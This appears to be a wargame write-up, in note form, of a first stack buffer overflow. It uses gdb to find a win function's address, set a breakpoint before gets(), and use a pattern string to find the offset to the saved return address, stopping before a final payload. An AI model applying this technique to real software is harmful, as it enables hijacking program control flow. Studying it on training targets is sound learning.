Wargames —  first overflow

No sigsegv function, but there’s  a win function. For the win function to be called, the buffer needs to be overflowed in a way such that the return address holds the address of the win function. That way, when the vuln function exits, the program goes the win function and prints the flag.

>>> I opened thee program in gdb and looked at the address of the first address of the win function  

Disassemble win       //;0x08048616

This is what needs to be written in the return address

>>> I also disassembled vuln function and put a breakpoint before the buffer is written ie before the gets call in vuln ( )

Disassemble vuln

b *0x080486a9

>>> Note: the return address currently is the address of the next instruction in main after the call to the vuln function

You can know this address either by disassembling main and seeing the next address after the vuln function call or by typing the command ‘where’ when the program stops at the breakpoint

This shows you where you are and what the next return address is

>>> Now I wanted to see the stack and see if I could find the return address. This way I could know how much buffer there is to overflow before the return address

x /40xw $esp //; to see 40 words from the ESP

>>> One method could be to calculate the exact number of characters  to overflow the buffer. However, I chose a different technique by sending arbitrary characters and seeing which ones overflowed the return address

AAAAAAAAAASSSSSSSSSSDDDDDDDDDDFFFFFFFFFFGGGGGGGGGGHHHHHHHHHH

Where    //; to see the first return address

x /40xw $esp //; to see 40 words from the ESP

>>>> The return address was 0x47474747 or GGGG

Over flowed characters  just before the ret address :
AAAAAAAAAASSSSSSSSSSDDDDDDDDDDFFFFFFFFFFGGGG
